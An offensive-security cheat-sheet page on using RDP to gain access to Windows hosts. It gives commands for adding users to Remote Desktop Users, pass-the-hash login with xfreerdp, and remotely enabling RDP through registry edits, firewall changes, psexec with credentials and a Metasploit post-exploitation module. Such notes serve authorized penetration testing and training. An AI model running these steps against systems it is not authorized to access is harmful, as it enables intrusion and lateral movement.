---
description: >-
  How to use RDP (Remote desktop protocol) to gain access to a host, rdp runs on
  port 3389 by default in windows.
---

# Remote Desktop

A user need to be part of the "Remote Desktop Users" in order to login to the host via RDP.

To add user to the "Remote Desktop users" run:

```text
net localgroup "Remote Desktop Users" UserLoginName  /add
```

## rdesktop

Remote Desktop for windows with share and 85% screen: 

`rdesktop -u username -p password -g 85% -r disk:share=/tmp/share 10.10.10.10` 

## xfreerdp

**Login using hash:**

`Xfreerdp /u:admin /d:win2012 /pth:[hash] /v:192.168.0.1` 

When CredSSP is required: 

`xfreerdp --plugin rdpdr --data disk:home:/tmp -- -f -u john 192.168.0.44` 

* To exit press 'ctrl+alt+enter' 

## remmina 

install remmina:

`apt install remmina`

have a rdp client by default which you can use to connect.

## Enable RDP

### Enable rdp from registry

```text
reg add "\\host\HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### Enable from netsh

```text
netsh advfirewall set service remoteadmin enable 
netsh advfirewall set service remotedesktop enable
```

### Enable using psexec

```text
psexec \\host reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
/usr/local/bin/psexec.py user:password@10.0.0.1 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

```

## Enable using metasploit

```text
use post/windows/manage/enable_rdp
msf5 post(windows/manage/enable_rdp) > run

[*] Enabling Remote Desktop
[*] 	RDP is disabled; enabling it ...
[*] Setting Terminal Services service startup mode
[*] 	The Terminal Services service is not set to auto, changing it to auto ...
[+] 	RDP Service Started
[*] 	Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20200520112125_default_10.50.30.103_host.windows.cle_789147.txt
[*] Post module execution completed
msf5 post(windows/manage/enable_rdp) > 

```

